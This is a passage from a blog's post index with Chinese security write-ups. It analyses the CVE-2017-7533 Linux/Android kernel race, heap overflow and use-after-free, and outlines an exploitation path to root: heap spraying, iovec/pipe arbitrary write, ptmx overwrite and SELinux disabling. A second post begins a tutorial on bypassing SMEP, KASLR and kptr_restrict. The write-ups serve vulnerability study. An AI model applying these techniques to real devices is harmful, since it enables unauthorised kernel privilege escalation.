如果我想换一个linux内核那是不是还得重新编译内核和更新虚拟机和串口配置，比较繁琐。","categories":[{"name":"Linux","slug":"Linux","permalink":"http://github.com/categories/Linux/"}],"tags":[{"name":"Tools","slug":"Tools","permalink":"http://github.com/tags/Tools/"}]},{"title":"CVE-2017-7533","slug":"CVE-2017-7533","date":"2018-03-25T11:19:17.000Z","updated":"2019-03-30T10:08:20.125Z","comments":true,"path":"2018/03/25/CVE-2017-7533/","link":"","permalink":"http://github.com/2018/03/25/CVE-2017-7533/","excerpt":"","text":"CVE-2017-7533 前言漏洞信息 实验环境：Pixel XL [google/marlin/marlin:7.1.1/NMF26U/3562008:user/release-keys] 漏洞类型：条件竞争–&gt;堆溢出，申请堆时使用的字符串长度通过条件竞争改变，导致拷贝时堆内存不够，破坏slab数据 Linux补丁链接：https://git.kernel.org/pub/scm/linux/kernel/git/torvalds/linux.git/commit/?id=49d31c2f389acfe83417083e1208422b4091cd9e Android补丁链接：无(披露信息:https://source.android.com/security/bulletin/2017-12-01) 漏洞成因：http://seclists.org/oss-sec/2017/q3/240 相关信息：Linux_kernel &lt;= 4.12.4版本,fsnotify实现中存在竞争条件漏洞，发生在inotify_handle_event( )和vfs_rename( )函数之间,因为内核通过这两个函数对同一个文件同时做重命名操作和打开操作时并没有加锁,所以会存在条件竞争漏洞,会导致释放后重引用和堆溢出漏洞。如果本地用户通过构造恶意的数据,可用作本地权限提升和造成拒绝服务。 漏洞验证https://github.com/hardenedlinux/offensive_poc/blob/master/CVE-2017-7533/exploit.c 背景知识首先了解下漏洞涉及到的Inotify机制(文件系统变化通知机制)。为了更好的管理设备，给用户提供更好的服务，如hotplug，udev和inotify就是这类需求催生的，Hotplug是一种内核想用户态应用通报关于热插拔设备事件发生的机制，udev动态维护/dev下的设备文件，inotify是一种文件系统变化通知机制，如文件增加、删除、重命名等事件可以立刻让用户态获得。Inotify API用于检测文件系统变化的机制，可用于检测单个文件，也可以用于检测整个目录，该机制出现的目的是当内核空间发生某种事件之后，可以立即通知用户空间，方便用户做出具体的操作，该漏洞就出现在inotify机制相关的函数中。Inotify即可以监视文件，也可以监视目录Inotify使用系统调用而非SIGIO来通知文件系统时间Inotify使用文件描述符作为接口，因而可以使用通常的I/O操作select和poll来监视文件系统的变化。用户层接口: inotify_init（void）：用于创建一个inotify的实例，返回inotify事件队列的文件描述符 inotify_add_watch（int fd，const char* pathname，uint32_t mask）：用于添加”watch list（检测列表）”，成功返回一个unique的watch描述符 inotify_rm_watch（int fd，int wd）：用于从watch list中移除检测的对象可以通过read函数获取监听到的事件: size_t len = read (fd, buf, BUF_LEN); :fd指向inotify实例的文件描述符数据结构123456789101112struct inotify_event &#123; int wd; /* Watch descriptor */ uint32_t mask; /* Mask of events */ uint32_t cookie; /* Unique cookie associating related events (for rename(2)) */ uint32_t len; /* Size of name field */ char name[]; /* Optional null-terminated name */&#125;;.wd : 检测对象的watch descriptor.mask : 检测事件的mask.cookie : 和rename事件相关.len : name字段的长度.name : 检测对象的name 1234567struct inotify_event_info &#123; struct fsnotify_event fse; int wd; u32 sync_cookie; int name_len; char name[];&#125;; 12345678910111213141516Inotify 可以监视的文件系统事件包括：- IN_ACCESS，即文件被访问- IN_MODIFY，文件被 write- IN_ATTRIB，文件属性被修改，如 chmod、chown、touch 等- IN_CLOSE_WRITE，可写文件被 close- IN_CLOSE_NOWRITE，不可写文件被 close- IN_OPEN，文件被 open- IN_MOVED_FROM，文件被移走,如 mv- IN_MOVED_TO，文件被移来，如 mv、cp- IN_CREATE，创建新文件- IN_DELETE，文件被删除，如 rm- IN_DELETE_SELF，自删除，即一个可执行文件在执行时删除自己- IN_MOVE_SELF，自移动，即一个可执行文件在执行时移动自己- IN_UNMOUNT，宿主文件系统被 umount- IN_CLOSE，文件被关闭，等同于(IN_CLOSE_WRITE | IN_CLOSE_NOWRITE)- IN_MOVE，文件被移动，等同于(IN_MOVED_FROM | IN_MOVED_TO) 漏洞成因:相关函数缓冲区溢出链:open -&gt; SyS_open -&gt; do_sys_open -&gt; fsnotify_open -&gt; fsnotify_parent -&gt; __fsnotify_parent -&gt; fsnotify -&gt; send_to_group -&gt; inotify_handle_event来看看inotify机制中的一个堆溢出漏洞，当监控文件被打开时会调用到下面这个函数Heap-Overflow:123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657int inotify_handle_event(struct fsnotify_group *group, struct inode *inode, struct fsnotify_mark *inode_mark, struct fsnotify_mark *vfsmount_mark, u32 mask, void *data, int data_type, const unsigned char *file_name, u32 cookie)&#123; struct inotify_inode_mark *i_mark; struct inotify_event_info *event; struct fsnotify_event *fsn_event; int ret; int len = 0; int alloc_len = sizeof(struct inotify_event_info); /* 计算inotify_event_info结构体大小 */ BUG_ON(vfsmount_mark); if ((inode_mark-&gt;mask &amp; FS_EXCL_UNLINK) &amp;&amp; (data_type == FSNOTIFY_EVENT_PATH)) &#123; struct path *path = data; if (d_unlinked(path-&gt;dentry)) return 0; &#125; if (file_name) &#123; len = strlen(file_name); /* 如果文件名为真,则计算文件名长度 */ alloc_len += len + 1; &#125; pr_debug(\"%s: group=%p inode=%p mask=%x\\n\", __func__, group, inode, mask); i_mark = container_of(inode_mark, struct inotify_inode_mark, fsn_mark); event = kmalloc(alloc_len, GFP_KERNEL); /* 分配内存大小等于 sizeof(inotify_event_info) + sizeof(file_name) */ if (unlikely(!event)) return -ENOMEM; fsn_event = &amp;event-&gt;fse; fsnotify_init_event(fsn_event, inode, mask); event-&gt;wd = i_mark-&gt;wd; event-&gt;sync_cookie = cookie; event-&gt;name_len = len; if (len) strcpy(event-&gt;name, file_name); /* 溢出点 把file_name拷贝到之前分配的内存中 */ ret = fsnotify_add_event(group, fsn_event, inotify_merge); if (ret) &#123; /* Our event wasn't used in the end. Free it. */ fsnotify_destroy_event(group, fsn_event); &#125; if (inode_mark-&gt;mask &amp; IN_ONESHOT) fsnotify_destroy_mark(inode_mark, group); return 0;&#125;溢出结构体struct inotify_event_info &#123; struct fsnotify_event fse; int wd; u32 sync_cookie; int name_len; char name[]; /* 拷贝时存在溢出 */&#125;; 我们来看看这个函数，首先计算inotify_event_info结构体的大小，然后计算目标文件名的长度，通过前面计算的值使用kmalloc分配出来一块内存，如果file_name的长度不为0，那么就使用strcpy函数把file_name拷贝到event-&gt;name处，也就是之前通过计算file_name长度申请的内存中。问题就出在这个函数中，仔细看会发现这里存在一个堆溢出漏洞(HeapOverflow)，实际上这个HeapOverflow是因为竞争条件(Race-condition)产生的。在访问file_name资源时未做加锁操作，存在一种情况是第一次计算长度时的file_name与第二次strcpt拷贝时的file_name内容不一致，因为strcpy的目标内存是通过计算第一次file_name的长度申请的内存，并且使用的还是strcpy不安全的拷贝函数，所以如果第二次的file_name内容的长度大于第一次计算的长度，那么这里就存在一个堆溢出漏洞。这种情况很好触发的，只需要再开启一个线程，当线程A执行完strlen(file_name)和kmalloc(alloc_len, GFP_KERNEL)操作后，线程B去修改file_name的内容，当线程A再返回去执行strcpy时就会出现前面说到的堆溢出情况。Race-condition:常见的竞争条件漏洞分为两种:第1种属于time-of-check-to-time-of-use漏洞,程序先检查对象的某个特征,后续的动作是假设这些特征一直保持的情况下作出的,但是这时的特征可能已经不具备了,导致信息不同步问题。第2种是因为程序的编写者考虑不周全,操作某些关键数据时未对数据做多线程/进程保护,导致多线程/进程访问同一资源时产生资源未及时更新的问题,可以通过这个冲突来对系统进行攻击。避免出现竞争条件可以通过对关键数据做加锁操作。竞争条件漏洞模式及其检测 条件竞争模式:具备的条件: 存在两个(或两个以上)时间发生,两个事件存在一定的间隔时间,两个事件存在一定的关系,即第二个事件(及其后的事件)依赖于第一个事件。 攻击者能够改变第一个事件所产生的,为第二个事件所依赖的假设。两事件之间是否存在间隔称为”编程条件”,间隔本身称为”编程间隔”,攻击者不但要发现这个间隔,还需要能够影响由第一个事件所产生的假设,这一条件称为”环境条件”。 该漏洞分为长文件名与短文件名两种溢出方式 长文件名使用kmalloc_256溢出 短文件名使用kmalloc_64溢出,不过现在的Android手机貌似已经去除了kmalloc_64分配要理解这两种溢出方式我们需要先来看看内核是如何存储溢出字符串的 1234567891011121314151617181920212223242526272829struct dentry &#123; /* RCU lookup touched fields */ unsigned int d_flags; /* protected by d_lock */ seqcount_t d_seq; /* per dentry seqlock */ struct hlist_bl_node d_hash; /* lookup hash list */ struct dentry *d_parent; /* parent directory */ /* 父目录的目录项对象 */ struct qstr d_name; /* qstr结构体中的name元素指向真正的文件名字符串 */ struct inode *d_inode; /* Where the name belongs to - NULL is * negative */ unsigned char d_iname[DNAME_INLINE_LEN]; /* small names */ /* 文件名长度&lt;32时会使用该数组存放文件名 */ /* Ref lookup also touches following */ struct lockref d_lockref; /* per-dentry lock and refcount */ const struct dentry_operations *d_op; struct super_block *d_sb; /* The root of the dentry tree */ unsigned long d_time; /* used by d_revalidate */ void *d_fsdata; /* fs-specific data */ struct list_head d_lru; /* LRU list */ struct list_head d_child; /* child of parent list */ struct list_head d_subdirs; /* our children */ /* * d_alias and d_rcu can share memory */ union &#123; struct hlist_node d_alias; /* inode alias list */ struct rcu_head d_rcu; &#125; d_u;&#125;; dentry(directory entry):目录项进程每次open一个文件，就会有一个file对象与之对应，同一个文件可以打开多次从而得到不同的file对象，file对象描述了被打开文件的属性，读写的偏移指针等信息。不同的file对象可以对应同一个dentry结构。dentry结构体保存则目录项和对应的文件inode信息。inode中不存储文件名字，只存储节点号，而dentry则保存文件名和预期对应的节点号，所以可以通过不同的dentry访问同一个inode。再来看一下dentry结构体是怎么分配的内存申请链:rename -&gt; sys_renameat2 -&gt; lookup_hash -&gt; __lookup_hash -&gt; lookup_dcache -&gt; d_alloc -&gt; __d_alloc123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960struct dentry *__d_alloc(struct super_block *sb, const struct qstr *name)&#123; struct dentry *dentry; char *dname; dentry = kmem_cache_alloc(dentry_cache, GFP_KERNEL);/* 创建一个dentry结构体 */ if (!dentry) return NULL; dentry-&gt;d_iname[DNAME_INLINE_LEN-1] = 0; /* d_iname数组末尾填上0结尾 */ if (name-&gt;len &gt; DNAME_INLINE_LEN-1) &#123; /* 判断文件名的长度是否大于d_iname数组的大小 DNAME_INLINE_LEN == 32 */ size_t size = offsetof(struct external_name, name[1]); /* 进入文件名长度 &gt; 32的处理流程 */ struct external_name *p = kmalloc(size + name-&gt;len, GFP_KERNEL);/* 分配内存 大小等于external_name结构体大小 + 字符串长度 */ if (!p) &#123; kmem_cache_free(dentry_cache, dentry); return NULL; &#125; atomic_set(&amp;p-&gt;u.count, 1); /* external_name结构体的u.count元素为引用计数 并设置为1 */ dname = p-&gt;name; /* 让dname指针指向external_name结构体的name元素 */ if (IS_ENABLED(CONFIG_DCACHE_WORD_ACCESS)) kasan_unpoison_shadow(dname, round_up(name-&gt;len + 1, sizeof(unsigned long))); &#125; else &#123; /* 如果文件名长度小于DNAME_INLINE_LEN(32个字符)那么直接让dname指向dentry结构体的d_iname数组元素 */ dname = dentry-&gt;d_iname; &#125; dentry-&gt;d_name.len = name-&gt;len; /* 初始化dentry结构体中代表文件名长度的元素 */ dentry-&gt;d_name.hash = name-&gt;hash; memcpy(dname, name-&gt;name, name-&gt;len); /* 把实际的文件名拷贝到dname指针指向的内存 如果文件名长度&lt;32就拷贝到dentry-&gt;d_iname,如果长度&gt;32就拷贝到external_name-&gt;name */ dname[name-&gt;len] = 0; /* 添加0字符结尾 */ /* Make sure we always see the terminating NUL character */ smp_wmb(); dentry-&gt;d_name.name = dname; /* 让dentry结构体的d_name.name元素指向dname的位置(实际文件名)*/ dentry-&gt;d_lockref.count = 1; dentry-&gt;d_flags = 0; spin_lock_init(&amp;dentry-&gt;d_lock); seqcount_init(&amp;dentry-&gt;d_seq); dentry-&gt;d_inode = NULL; dentry-&gt;d_parent = dentry; dentry-&gt;d_sb = sb; dentry-&gt;d_op = NULL; dentry-&gt;d_fsdata = NULL; INIT_HLIST_BL_NODE(&amp;dentry-&gt;d_hash); INIT_LIST_HEAD(&amp;dentry-&gt;d_lru); INIT_LIST_HEAD(&amp;dentry-&gt;d_subdirs); INIT_HLIST_NODE(&amp;dentry-&gt;d_u.d_alias); INIT_LIST_HEAD(&amp;dentry-&gt;d_child); d_set_d_op(dentry, dentry-&gt;d_sb-&gt;s_d_op); this_cpu_inc(nr_dentry); return dentry;&#125;struct external_name &#123; /* 如果文件名大于32,那么内核会创建一个该结构体用来存放新文件名 */ union &#123; atomic_t count; /* 引用计数 */ struct rcu_head head; &#125; u; unsigned char name[]; /* 文件名 */&#125;; 首先根据文件名的长度判断属于长文件还是短文件 如果大于32个字符就属于长文件，申请一片空间，申请的空间大小等于external_name结构体大小加文件名长度，分配成功后就把文件名拷贝到申请的内存中，其实这就相当于创建了一个external_name结构体，然后把文件名拷贝到external_name结构体后面。 如果小于等于32个字符那么就属于短文件，直接把文件名拷贝到dentry结构体变量的d_iname数组中。 不管是长文件还是短文件，最后都会把dentry结构体中的d_name.name指向最终存放文件名的位置，这就是文件名两种不同的存放方式。 再来看下rename时是如何把oldname改为newname的重命名链: rename -&gt; sys_renameat2 -&gt; vfs_rename -&gt; d_move -&gt; __d_move -&gt; copy_name123456SYSCALL_DEFINE2(rename, const char __user *, oldname, const char __user *, newname)&#123; return sys_renameat2(AT_FDCWD, oldname, AT_FDCWD, newname, 0);&#125;SYSCALL_DEFINE5(renameat2, int, olddfd, const char __user *, oldname, int, newdfd, const char __user *, newname, unsigned int, flags) Use-After-Free:123456789101112131415161718192021222324252627static void copy_name(struct dentry *dentry, struct dentry *target)&#123; struct external_name *old_name = NULL; if (unlikely(dname_external(dentry))) /* 判断old文件名是长文件名还是短文件名 */ old_name = external_name(dentry); /* 如果为长文件名,就备份一下old_name 后续做释放 */ if (unlikely(dname_external(target))) &#123; /* 判断新文件名长度是否大于32,大于32进入*/ atomic_inc(&amp;external_name(target)-&gt;u.count); /* 引用计数-1*/ dentry-&gt;d_name = target-&gt;d_name; /* 让旧文件名dentry的d_name元素直接指向新文件名dentry的d_name */ &#125; else &#123; memcpy(dentry-&gt;d_iname, target-&gt;d_name.name, /* 否则表示新文件名长度小于32,直接把newname拷贝到栈中的dentry-&gt;d_iname处 */ target-&gt;d_name.len + 1); dentry-&gt;d_name.name = dentry-&gt;d_iname; dentry-&gt;d_name.hash_len = target-&gt;d_name.hash_len; &#125; if (old_name &amp;&amp; likely(atomic_dec_and_test(&amp;old_name-&gt;u.count)))/* 如果老文件名长度&gt;64 并且结构体引用计数为0,那么就把老文件名做释放操作 */ kfree_rcu(old_name, u.head); /* old_name -&gt; UAF结构体 */&#125;static inline int dname_external(const struct dentry *dentry)&#123; return dentry-&gt;d_name.name != dentry-&gt;d_iname; /* 检查dentry的d_name.name 与 dentry-&gt;d_iname是否指向同一块内存 */&#125;static inline struct external_name *external_name(struct dentry *dentry) /* 获取文件名的位置 */&#123; return container_of(dentry-&gt;d_name.name, struct external_name, name[0]);&#125; 一样的，首先还是判断old文件属于长文件还是短文件。如果是短文件，直接把新文件名直接拷贝到旧dentry变量中的d_iname数组中,然后让旧dentry-&gt;d_name指向dentry-&gt;d_iname。如果是长文件名那么就把odl_name指针指向旧dentry-&gt;d_name指向的结构体方便后面释放时索引，然后把旧dentry-&gt;d_name指向新dentry-&gt;d_name,接着判断old_name结构体中的引用计数是否为0,如果为0那么就使用kfree_rcu释放掉old_name这个结构体。这里还存在一个UAF漏洞，因为这里被释放的old_name-&gt;name在inotify_handle_event函数中存在释放后重引用的情况，后面的漏洞利用会用到这个UAF漏洞。 触发模型漏洞利用利用思路随机地址写任意值 -&gt; 可控地址写任意值1.因为最终触发的是一个堆溢出，会对溢出对象后面的内存进行写数据操作，不过这里被写的地址是我们不可控的，因为我们不知道被溢出的那个event对象会被分配在内存的什么位置，如果想要在指定的地址上写任意值的话还需要做一些别的操作。 在对内存进行布局之前我们先来看看pipe subsystem中存在的一个TOCTTOU（time of check to time of user）检查时间到使用时间的问题，就是检查值的操作与使用值的操作之间存在间隔，可以在这间隔时间去修改检查后的值，这就会导致使用时的值实际上已经不是检查时的值了。这也属于竞争条件漏洞的一种，这和7533的竞争条件原理差不多。不过在pipe中的time of use是我们可控的。 通过readv和writev来控制检查/使用时间1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950static ssize_t do_readv_writev(int type, struct file *file, const struct iovec __user * uvector, unsigned long nr_segs, loff_t *pos)&#123; size_t tot_len; struct iovec iovstack[UIO_FASTIOV]; struct iovec *iov = iovstack; ssize_t ret; io_fn_t fn; iov_fn_t fnv; iter_fn_t iter_fn; ret = rw_copy_check_uvector(type, uvector, nr_segs, /* rw_copy_check_uvector对传入的用户层的iovec做校验，并拷贝到内核态 */ ARRAY_SIZE(iovstack), iovstack, &amp;iov); if (ret &lt;= 0) goto out; tot_len = ret; ret = rw_verify_area(type, file, pos, tot_len); if (ret &lt; 0) goto out; fnv = NULL; if (type == READ) &#123; /* read */ fn = file-&gt;f_op-&gt;read; fnv = file-&gt;f_op-&gt;aio_read; iter_fn = file-&gt;f_op-&gt;read_iter; &#125; else &#123; /* write */ fn = (io_fn_t)file-&gt;f_op-&gt;write; fnv = file-&gt;f_op-&gt;aio_write; iter_fn = file-&gt;f_op-&gt;write_iter; file_start_write(file); &#125; if (iter_fn) ret = do_iter_readv_writev(file, type, iov, nr_segs, tot_len, pos, iter_fn); else if (fnv) ret = do_sync_readv_writev(file, iov, nr_segs, tot_len, pos, fnv); else ret = do_loop_readv_writev(file, iov, nr_segs, pos, fn); if (type != READ) file_end_write(file);out: if (iov != iovstack) kfree(iov); if ((ret + (type == READ)) &gt; 0) &#123; if (type == READ) fsnotify_access(file); else fsnotify_modify(file); &#125; return ret;&#125; 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455ssize_t rw_copy_check_uvector(int type, const struct iovec __user * uvector, unsigned long nr_segs, unsigned long fast_segs, struct iovec *fast_pointer, struct iovec **ret_pointer)&#123; unsigned long seg; ssize_t ret; struct iovec *iov = fast_pointer; if (nr_segs == 0) &#123; /* nr_segs表示iovec的个数 等于0就退出*/ ret = 0; goto out; &#125; if (nr_segs &gt; UIO_MAXIOV) &#123; /* nr_segs不能大于UIO_MAXIOV（1024） */ ret = -EINVAL; goto out; &#125; if (nr_segs &gt; fast_segs) &#123; /* 如果nr_segs 大于8(ARRAY_SIZE(iovstack)) 那么就重新申请内存进行存储,小于8就直接放在开始申请的栈中的数组里面 */ iov = kmalloc(nr_segs*sizeof(struct iovec), GFP_KERNEL); if (iov == NULL) &#123; ret = -ENOMEM; goto out; &#125; &#125; if (copy_from_user(iov, uvector, nr_segs*sizeof(*uvector))) &#123; /* 把应用层的数据拷贝新内核层中 */ ret = -EFAULT; goto out; &#125; ret = 0; for (seg = 0; seg &lt; nr_segs; seg++) &#123; /* 对iovec中的iov_base与iov_len做合法性检查，iov_base必须指向用户态且iov_len不存在溢出*/ void __user *buf = iov[seg].iov_base; ssize_t len = (ssize_t)iov[seg].iov_len; /* see if we we're about to use an invalid len or if * it's about to overflow ssize_t */ if (len &lt; 0) &#123; ret = -EINVAL; goto out; &#125; if (type &gt;= 0 &amp;&amp; unlikely(!access_ok(vrfy_dir(type), buf, len))) &#123; ret = -EFAULT; goto out; &#125; if (len &gt; MAX_RW_COUNT - ret) &#123; len = MAX_RW_COUNT - ret; iov[seg].iov_len = len; &#125; ret += len; &#125;out: *ret_pointer = iov; return ret;&#125; rw_copy_check_uvector函数主要是判断iovec的个数是否为零和是否大于1024，如果都不成立的话就使用copy_from_user函数把用户态的iovec数据拷贝到内核态的中，如果传入的iovec个数大于8个就使用kmalloc在内核态申请一片内存进行存放用户态的iovecarray数据，如果小于等于8个那么就直接使用内核栈存放iovec array数据，接着遍历判断每个iovec结构体中的iov_base是否属于用户态地址并且iov_len是否不会出现溢出。这里的检测就是前面说的TOCTTOU中的time of check操作。iovec array在内核中存放的样子 检查完毕后通过判断type来区分是readv还是writev，如果是readv函数调用进来的，会走到pipe_read函数中，pipe_read函数会检查iovec中的iov_base指向的地址是否可写，pipe写端是否有数据，如果此时写端没有数据该函数就进入到等待模式，等待witev对pipe进行写入，当我们在用户态调用writev对pipe进行写入的时候，pipe_read就会把我们写入到pipe中的数据写入对应的iov_base指向的地址中。这里就属于TOCTTOU中的time of use操作。因为写入时间通过用户态调用writev来触发的，所以写入的值和写入的时机都是我们可控的。 如果我们能够在第一次检查iov_base指向地址是否为用户态地址后把iov_base指向的地址改为内核地址，当在第二次检查时因为只检查了是否可写而没检查是否为用户态地址，所以后续pipe_read会直接把我们writev传入的值写入到iov_base指向的内核地址中，这就达到了一个内核地址写操作。 引用一下少仲大佬的流程图 结合前面的堆溢出漏洞，可以把需要写入的内核地址溢出到iov_base上，这样写入地址，写入值都由我们控制了，不过写入地址有一个限制，因为是strcpy函数导致的溢出，所以写入地址中不能带有0字符不然就会存在截断问题。 内存布局现在的问题是如何把iovec结构体数组布局到受害对象event结构体后面？我们需要想办法对堆内存进行布局，促使溢出结构体后面是我们可控的数据（iovec结构体数组），这样在触发堆溢出的时候才能完成对iovec-&gt;iov_base值的非正常修改。为了更容易让堆布局到我们理想的状态，我们可以先使用event对象把内核中slab空洞填满，然后内核会分配新的slab内存块，接着申请大量的iovec数组，然后间隔释放iovec数组同时再次创建event对象去填充间隔释放的iovec数组与触发堆溢出漏洞。12345Event object / Payload / Victim objectEvent object （监听事件对象）Payload == 喷射数据(也就是strcpy操作的数据，Event对象中的name指向)Victim object （pipe受害对象） 理想的内存布局 竞争条件 -&gt; 释放后重引用 -&gt; 堆溢出 构造溢出数据这里需要注意网上公布的poc是基于短文件名的，但是android默认好像已经没有使用kmalloc-64了，在kmalloc时最少都会使用kmalloc-128，这样就导致文件名太短无法溢出到下一个slab，所以在android上运行poc每次都只是检测到了溢出但是并没有导致设备崩溃，下面是通过构造长文件名来触发溢出kmalloc-256。123inotify_event_info结构体大小为0x2c，也就是说最起码都有0x2c大小(gdb) p &amp;((struct inotify_event_info*)0)-&gt;name$1 = (char (*)[]) 0x2c &lt;-- 44 1234567264 - 256 = 8 需要溢出8个字节事件结构体: 44 + 200 = 244264 - 244 = 20(喷射字符串必须比实际字符串多20)喷射结构体：44 + 200 + 20 = 264实际拷贝字符串长度：200 + 20 = 220 (拷贝的长度)喷射构造:16 + 220 = 236(实际喷射字节 16的UAF结构体头部,220的实际字符串拷贝)16 + 220 = 16 + 212 + 8 = 头部(16) + 填充值(212) + 写入地址(8) 构造好了一个任意地址读写，那么提权就只是套路了。 思考短文件名如果内核支持kmalloc-64的话短文件名其实也可以利用，比如HUAWEI Mate9，可以通过spray ipv6_mc_socklist，触发堆溢出对rcu进行覆盖，通过rcu回调来控制内核执行流程，只是猜想并没有验证，以后有时间再看看。123456789struct ipv6_mc_socklist &#123; struct in6_addr addr; int ifindex; struct ipv6_mc_socklist __rcu *next; /* &lt;&lt;&lt;&lt;&lt;&lt;&lt; Overflow &lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt; */ rwlock_t sflock; unsigned int sfmode; /* MCAST_&#123;INCLUDE,EXCLUDE&#125; */ struct ip6_sf_socklist *sflist; struct rcu_head rcu;&#125;; 权限提升现在我们实现了任意地址写任意值，那么如何进行权限提升呢？ 通过漏洞把ptmx-&gt;check_flags改为work_for_cpu_fn 通过fcntl函数触发work_for_cpu_fn，间接调用register_sysctl_table函数注册新sysctl 通过read触发新sysctl的处理函数，间接调用kernel_sock_ioctl函数修改limit 通过pipe对内核进行任意读写，patch关键结构体 减少硬编码的方式在kernel\\sysctl.c这个文件中存在对kptr_restrict的sysctl结构体进行初始化操作，我们可以通过内存遍历获取到kptr_restrict符号的地址，然后修改为0，这样就关闭了kptr_restrict保护机制用来过滤一些地址，以此避免将内核地址泄漏给攻击者，通过配置kptr_restrict的值来控制是否开启: 0:完全禁止 1:使用”%pk”打印的内核指针被隐藏(以0替换)，除非用户存在CAP_SYSLOG权限。 2:所有内核使用”%pk”打印的都被隐藏 123456789&#123; .procname = \"kptr_restrict\", .data = &amp;kptr_restrict, .maxlen = sizeof(int), .mode = 0644, .proc_handler = proc_dointvec_minmax_sysadmin, .extra1 = &amp;zero, .extra2 = &amp;two,&#125;, 123456789.text:FFFFFFC001237700 aKptrRestrict DCB \"kptr_restrict\",0.text:FFFFFFC00156D0C8 DCQ 0xFFFFFFC001237700.text:FFFFFFC00156D0D0 DCQ 0xFFFFFFC001760B78.text:FFFFFFC00156D0D8 DCQ 0x1A400000004.text:FFFFFFC00156D0E0 DCQ 0marlin:/data/local/tmp $ cat /proc/kallsyms |grep kptr_restrictffffffc001760b78 B kptr_restrict exploit编写流程6.0~7.0 -&gt; root方案利用步骤 步骤0：准备资源并填充缓冲区 步骤1：产生读取线程并使用iovec对象对堆进行布局 步骤2：产生竞争线程 第3步：赢得比赛，触发溢出实现任意地址写任意值 fcntl（ptmx_fd，F_SETFL，0x40002000）== 0x40002000 第4步：覆盖uid，禁用SELinux并产生ROOT外壳 修补方案总结最开始分析的时候被网上公布的poc坑了,一直以为只是简单的堆溢出漏洞,后来才发现还存在一个UAF漏洞。一般的条件竞争漏洞修补是都会进行加锁，所以分析下加锁的用意可能会对理解漏洞成因有所帮助。又学习了一种新的利用方法通过布局iovec实现任意读写的方式。 参考https://www.ibm.com/developerworks/cn/linux/l-inotifynew/https://www.anquanke.com/post/id/129468The-Art-of-Exploiting-Unconventional-Use-after-free-Bugs-in-Android-Kernelasia-18-WANG-KSMA-Breaking-Android-kernel-isolation-and-Rooting-with-ARM-MMU-features","categories":[{"name":"Vulnerability","slug":"Vulnerability","permalink":"http://github.com/categories/Vulnerability/"}],"tags":[{"name":"Android_Kernel","slug":"Android-Kernel","permalink":"http://github.com/tags/Android-Kernel/"}]},{"title":"Linux Kernel x86-64 bypass SMEP-KASLR-kptr_restric","slug":"Linux Kernel x86-64 bypass SMEP-KASLR-kptr_restric","date":"2018-03-11T16:05:36.000Z","updated":"2018-08-26T10:39:25.728Z","comments":true,"path":"2018/03/12/Linux Kernel x86-64 bypass SMEP-KASLR-kptr_restric/","link":"","permalink":"http://github.com/2018/03/12/Linux Kernel x86-64 bypass SMEP-KASLR-kptr_restric/","excerpt":"","text":"Linux Kernel x86-64 bypass SMEP-KASLR-kptr_restric Background(背景)Before to get into a genuine exploitation of a kernel vulnerable module，let’s see which protections we need to bypass在深入了解内核易受攻击的某块之前，我们来看看需要绕过哪些保护机制 SMEP（管理模式执行保护）SMEP stands for Supervisor Mode Execution ProtectionSMEP代表管理模式执行保护This kernel protection doesn’t allow a user space code to be executed by the kernel.内核保护不允许内核执行用户态空间代码，To check if SMEP is activated，we can simply read /porc/cpuinfo要检查SMEP是否被激活，可以简单的阅读/proc/cpuinfo1234# cat /proc/cpuinfo | grep smep......flags : fpu vme de pse tsc msr pae mce cx8 apic sep mtrr pge mca cmov pat pse36 clflush dts mmx fxsr sse sse2 ss ht syscall nx pdpe1gb rdtscp lm constant_tsc arch_perfmon pebs bts nopl xtopology tsc_reliable nonstop_tsc aperfmperf eagerfpu pni pclmulqdq ssse3 fma cx16 pcid sse4_1 sse4_2 x2apic movbe popcnt tsc_deadline_timer aes xsave avx f16c rdrand hypervisor lahf_lm abm 3dnowprefetch epb fsgsbase tsc_adjust bmi1 hle avx2 smep bmi2 invpcid rtm rdseed adx smap xsaveopt xsavec xgetbv1 dtherm ida arat pln pts hwp hwp_notify hwp_act_window hwp_epp..... SMEP is the 20th bit of the CR4 registerSMEP是CR4寄存器中的第20位： KASLR(内核地址空间随机布局)KASLR stands for Kernel Address Space Layout Randomization.KASLR代表内核地址空间随机化布局It aims to make some kernel exploits more difficult to implement by randomizing the base address value of the kernel（boot time）它指通过随机化内核的基地址值来使一些内核漏洞更难利用（开机时间）Exploits that rely on the locations of internal symbols must discover the randomized base address依靠内部内核符号位置的漏洞必须发现随机化的基地址 Kernel Address Display Restriction（内核地址显示限制）kptr_restrict indicates if restrictions are placed on exposing kernel addresses via/proc and other interfaceskptr_restrict指示是否限制通过/proc和其他接口公开内核地址 the default,there are no restrictions.（默认情况下,没有任何限制） kernel pointers printed using the %pK format speciffier will be replaced with o’s unless the user has CAP_SYSLOG.（除非用户具有CAP_SYSLOG功能，否则使用%pK格式说明符打印的指针将会被替换为0） kernel pointers printed using %pK will be replaced with o’s regardless of privileges.（无论权限如何，使用%pK打印的内核指针将被替换为0）In other words，we can’t get commit_creds addr just by reading the /proc/kallsyms:换句话说，我们不能通过阅读/proc/kallsyms来获取commit_creds addr:12# cat /proc/kallsyms | grep commit_creds0000000000000000 T commit_creds Privilege escalation（特权升级）As always，our goal is to get the top privilege and for that，we just need to execute the following与往常一样，我们的目标是获取最高权限，为此只想执行以下操作1commit_creds(prepare_kernel_cred(0)) Get back to user land（返回用户位置）Even if we can bypass SMEP，we can’t just try to execute /bin/sh in our user code.We need to go back to user land correctly即使我们可以绕过SMEP，我们也不能试图在我们的用户代码中执行/bin/sh。我们需要正确地返回到用户位置 This can be done with two gadgets：这可以使用两个gadget完成12swapgsiretq Followed by this structure：（紧随其后的是这种结构）12345the next RIPuser land CSuser land EFLAGSuser land RSPuser land SS Exploitation测试代码：https://github.com/black-bunny/LinKern-x86_64-bypass-SMEP-KASLR-kptr_restric Vulnerable module1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071727374757677787980818283848586878889909192939495#include &lt;linux/module.h&gt;#include &lt;linux/version.h&gt;#include &lt;linux/kernel.h&gt;#include &lt;linux/types.h&gt;#include &lt;linux/kdev_t.h&gt;#include &lt;linux/fs.h&gt;#include &lt;linux/device.h&gt;#include &lt;linux/cdev.h&gt;#include &lt;asm/uaccess.h&gt;#include 